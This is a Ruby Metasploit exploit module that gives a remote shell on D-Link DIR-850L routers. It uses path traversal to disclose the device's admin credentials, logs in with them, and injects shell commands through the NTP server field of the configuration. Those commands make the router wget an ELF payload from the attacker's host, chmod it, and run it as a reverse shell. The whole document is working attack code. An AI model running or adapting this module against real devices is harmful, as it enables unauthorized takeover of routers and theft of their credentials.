##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::EXE
  include Msf::Auxiliary::Report
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'DIR-850L (Un)authenticated OS Command Exec',
      'Description' => %q{
        This module leverages an unauthenticated credential disclosure
        vulneralbility to then execute arbitrary commands on DIR-850L routers
        as an authenticated user. Unable to use Meterpreter payloads.
      },
      'Author' => [
        'Mumbai <https://github.com/realoriginal>' # module
      ],
      'References' => [
        ['URL', 'https://www.seebug.org/vuldb/ssvid-96333'],
        ['URL', 'https://blogs.securiteam.com/index.php/archives/3310'],
      ],
      'DisclosureDate' => 'Aug 9 2017',
      'Stance' => Msf::Exploit::Stance::Aggressive,
      'License' => MSF_LICENSE,
      'Platform' => 'linux',
      'Arch' => ARCH_MIPSBE,
      'DefaultTarget' => 0,
      'DefaultOptions' => {
        'PAYLOAD' => 'linux/mipsbe/shell/reverse_tcp'
      },
      'Privileged' => true,
      'Payload' => {
        'DisableNops' => true,
      },
      'Targets' => [[ 'Automatic', {} ]],
    ))

    register_options(
      [
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to requst the ARMLE payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('HTTP_DELAY', [ true, 'Time that the HTTP Server will wait for the ELF payload request', 60]),
        OptInt.new('CONNECTBACK_DELAY', [ true, 'Time to wait for shell to connect back to listener', 10])
      ])
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => '/',
        'method' => 'GET'
        })
      if res && res.headers['Server']
        auth = res.headers['Server']
        if auth =~ /DIR-850L/
          if auth =~ /WEBACCESS\/1\.0/
            return Exploit::CheckCode::Safe
          else
            return Exploit::CheckCode::Detected
          end
        end
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
    Exploit::CheckCode::Unknown
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def retrieve_creds
    begin
      xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
      xml << "<postxml>\r\n"
      xml << "<module>\r\n"
      xml << "  <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\r\n"
      xml << "</module>\r\n"
      xml << "</postxml>"
      uid = rand_text_alpha_lower(8)
      res = send_request_cgi({
        'uri' => '/hedwig.cgi',
        'method' => 'POST',
        'encode_params' => false,
        'headers' => {
          'Accept-Encoding' => 'gzip, deflate',
          'Accept' => '*/*'
        },
        'ctype' => 'text/xml',
        'cookie' => "uid=#{uid}",
        'data' => xml,
      })
      parse = res.get_xml_document
      username = parse.at('//name').text
      password = parse.at('//password').text
      vprint_good("#{peer} - Retrieved the username/password combo #{username}/#{password}")
      loot = store_loot("dlink.dir850l.login", "text/plain", rhost, res.body)
      print_good("#{peer} - Downloaded credentials to #{loot}")
      return username, password
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def retrieve_uid
    begin
      res = send_request_cgi({
          'uri' => '/authentication.cgi',
          'method' => 'GET',
      })
      parse = res.get_json_document
      uid = parse['uid']
      challenge = parse['challenge']
      return uid, challenge
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def login(username, password)
    uid, challenge = retrieve_uid
    begin
      hash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('md5'), password.to_s, (username.to_s + challenge.to_s)).upcase
      send_request_cgi({
        'uri' => '/authentication.cgi',
        'method' => 'POST',
        'data' => "id=#{username}&password=#{hash}",
        'cookie' => "uid=#{uid}"
      })
      return uid
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def execute(cmd, username, password)
    uid = login(username, password)
    payload = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
    payload << "<postxml>\r\n"
    payload << "<module>\r\n"
    payload << "  <service>DEVICE.TIME</service>\r\n"
    payload << "  <device>\r\n"
    payload << "    <time>\r\n"
    payload << "      <ntp>\r\n"
    payload << "        <enable>1</enable>\r\n"
    payload << "        <period>604800</period>\r\n"
    payload << "        <server>#{Rex::Text.rand_text_alpha_lower(8)}; (#{cmd}&); </server>\r\n"
    payload << "      </ntp>\r\n"
    payload << "      <ntp6>\r\n"
    payload << "        <enable>1</enable>\r\n"
    payload << "        <period>604800</period>\r\n"
    payload << "      </ntp6>\r\n"
    payload << "      <timezone>20</timezone>\r\n"
    payload << "      <time/>\r\n"
    payload << "      <date/>\r\n"
    payload << "      <dst>0</dst>\r\n"
    payload << "      <dstmanual/>\r\n"
    payload << "      <dstoffset/>\r\n"
    payload << "    </time>\r\n"
    payload << "  </device>\r\n"
    payload << "</module>\r\n"
    payload << "</postxml>"
    begin
      # save configuration
      res = send_request_cgi({
        'uri' => '/hedwig.cgi',
        'method' => 'POST',
        'ctype' => 'text/xml',
        'data' => payload,
        'cookie' => "uid=#{uid}"
      })
      # execute configuration
      res = send_request_cgi({
        'uri' => '/pigwidgeon.cgi',
        'method' => 'POST',
        'data' => 'ACTIONS=SETCFG,ACTIVATE',
        'cookie' => "uid=#{uid}"
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end


  def exploit
    print_status("#{peer} - Connecting to target...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access vulnerable url")
    end
    #
    # Information Retrieval, obtains creds and logs in
    #
    username, password = retrieve_creds

    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))

    @pl = generate_payload_exe
    @elf_sent = false

    # HTTP Server
    resource_uri = '/' + downfile
    if (datastore['DOWNHOST'])
      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
    else
      # no ssl...
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      #
      # Service URL
      #
      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri

      #
      # Retrieve UID from target after authentication
      #

      print_status("#{peer} - Starting up web service #{service_url}")

      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end


    #
    # Requests target to download payload
    #
    print_status("#{peer} - Asking target to request to download #{service_url}")

    filename = rand_text_alpha_lower(8)

    cmd = "wget #{service_url} -O /tmp/#{filename}"
    res = execute(cmd, username, password)
    if (!res)
      fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload")
    end

    if (datastore['DOWNHOST'])
      print_status("#{peer} - Giving #{datastore['HTTP_DELAY']} seconds to the device to download the payload")
      select(nil, nil, nil, datastore['HTTP_DELAY'])
    else
      wait_for_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")


    #
    # Sets binary permissions to executable
    #
    cmd = "chmod 777 /tmp/#{filename}"
    print_status("#{peer} - Requesting device to chmod #{downfile}")
    res = execute(cmd, username, password)
    if (!res)
      fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload") # fannccyyy
    end

    #
    # Executes binary on target
    #
    cmd = "/tmp/#{filename}"
    print_status("#{peer} - Requesting device to execute #{downfile}")
    res = execute(cmd, username, password)
    if (!res)
      fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload")
    end
    wait_for_connect
  end


  #
  # Handler for web server payload delivery
  #
  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{peer} - A request came in, but the payload was not ready")
      return
    end
    print_status("#{peer} - Sending payload to the server...")
    @elf_sent = true,
    send_response(cli, @pl)
  end

  #
  # Waits for shell to connect back to us, otherwise server stops and nothing is returned
  #
  def wait_for_connect
    print_status("#{peer} - Waiting #{datastore['CONNECTBACK_DELAY'].to_s} seconds for shell to connect back to us...")
    waited = 0
    while (@elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['CONNECTBACK_DELAY'])
        fail_with(Failure::Unknown, "#{peer} - Shell never connected to us!, disconnect?")
      end
    end
  end

  #
  # Waits for target to request payload
  #
  def wait_for_linux_payload
    print_status("#{peer} - Waiting for target to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Failure::Unknown, "#{peer} - Target didn't request the ELF payload - Maybe it can't connect back?") # ;-;
      end
    end
  end
end
